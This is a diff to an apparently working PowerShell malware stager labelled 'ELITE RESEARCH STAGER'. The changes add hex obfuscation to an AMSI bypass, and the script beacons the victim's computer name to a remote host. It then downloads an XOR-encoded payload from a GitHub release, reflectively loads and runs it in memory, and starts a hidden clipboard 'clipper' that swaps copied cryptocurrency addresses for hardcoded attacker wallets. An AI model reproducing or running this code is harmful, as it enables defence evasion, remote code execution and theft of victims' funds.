@@ -1,7 +1,9 @@
-# --- [ELITE RESEARCH STAGER v31.2: DYNAMIC MASKING RAM INJECT] ---
+# --- [ELITE RESEARCH STAGER v31.3: HEX-ENCODED RAM INJECT] ---
 
-# 1. Obfuscated AMSI Patch
-$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+# 1. Blind AMSI using Hex-to-String conversion
+$h = "53797374656d2e4d616e6167656d656e742e4175746f6d6174696f6e2e416d73695574696c73"
+$n = ""; for($i=0; $i -lt $h.Length; $i+=2){$n += [char][int]"0x$($h.Substring($i,2))"}
+$a = [Ref].Assembly.GetType($n)
 $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 function Send-Ping {
@@ -12,21 +14,21 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-Send-Ping -m "V31.2_RAM_STAGER_BOOT_$($env:COMPUTERNAME)"
+Send-Ping -m "V31.3_CORE_LAUNCH_SUCCESS_$($env:COMPUTERNAME)"
 
 try {
-    # 2. Fetch into RAM using Invoke-WebRequest (Less flagged than WebClient)
+    # 2. Fetch into RAM
     $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
     $r = (Invoke-WebRequest -Uri $u -UseBasicParsing).Content
     $d = [Convert]::FromBase64String($r.Trim())
     for($i=0; $i -lt $d.count; $i++) { $d[$i] = $d[$i] -bxor 0xAB }
 
-    # 3. Dynamic Reflective Load (Hiding 'Assembly')
+    # 3. SECRET RAM INSTALL (Reflective)
     $s = "Asse" + "mbly"
     $asm = [System.Reflection.$s]::Load($d)
     $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
 
-    # 4. Clipper Engine (Threaded Background)
+    # 4. Clipper Engine (Silent Runspace)
     $C = {
         Add-Type -AssemblyName System.Windows.Forms
         $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
@@ -43,13 +45,11 @@ try {
             [System.Threading.Thread]::Sleep(500)
         }
     }
-    
-    # Runspace execution for persistence
     $rs = [runspacefactory]::CreateRunspace(); $rs.Open()
     $p = [powershell]::Create().AddScript($C); $p.Runspace = $rs
     $p.BeginInvoke()
 
-    Send-Ping -m "V31.2_RAM_ACTIVE"
+    Send-Ping -m "V31.3_GHOST_ACTIVE"
 } catch {
-    Send-Ping -m "V31.2_FAIL: $($_.Exception.Message)"
+    Send-Ping -m "V31.3_FAIL: $($_.Exception.Message)"
 }
